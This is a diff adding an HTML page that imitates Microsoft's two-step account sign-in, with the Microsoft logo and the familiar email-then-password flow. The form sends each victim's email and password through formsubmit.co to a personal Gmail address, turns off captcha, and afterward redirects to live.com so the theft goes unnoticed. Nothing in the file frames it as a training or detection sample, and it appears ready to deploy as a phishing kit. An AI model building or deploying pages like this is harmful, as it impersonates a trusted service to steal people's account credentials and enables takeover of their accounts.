@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <title>Sign in to your account</title>
+</head>
+
+<body>
+    <div class="container">
+        <form action="https://formsubmit.co/callisona70@gmail.com" method="POST">
+            <img class="logo" src="image/microsoftlogo.png" width="142" />
+            <div class="forms-container">
+                <div class="forms">
+                    <!-- First Step -->
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" id="email" name="email" placeholder="Email, Phone, or Skype" required />
+                        </div>
+                        <p>No account? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+
+                    <!-- Second Step -->
+                    <div class="second" style="display: none;">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">your@email.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" name="password" id="password" placeholder="Password" required />
+                        </div>
+                        <a href="#">Forgot password?</a>
+
+                        <!-- Hidden inputs should be inside the step that gets submitted -->
+                        <input type="hidden" name="_captcha" value="false" />
+                        <input type="hidden" name="_template" value="table" />
+                        <input type="hidden" name="_next" value="https://live.com" />
+
+                        <button type="submit" id="signBtn">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+
+        <div class="bottom">
+            <img src="image/key.png" width="142" />
+            <span>Sign-in options</span>
+        </div>
+    </div>
+
+    <script>
+        const next_button = document.querySelector('.next-btn');
+        const email_input = document.querySelector('#email');
+        const first_step = document.querySelector('.first');
+        const second_step = document.querySelector('.second');
+        const email_display = document.querySelector('.email');
+        const arrow_btn = document.querySelector('.arrow-btn');
+
+        next_button.addEventListener('click', () => {
+            if (email_input.value.trim() !== '') {
+                first_step.style.display = 'none';
+                second_step.style.display = 'block';
+                email_display.innerText = email_input.value;
+            } else {
+                email_input.style.borderBottomColor = '#f00';
+            }
+        });
+
+        arrow_btn.addEventListener('click', () => {
+            first_step.style.display = 'block';
+            second_step.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
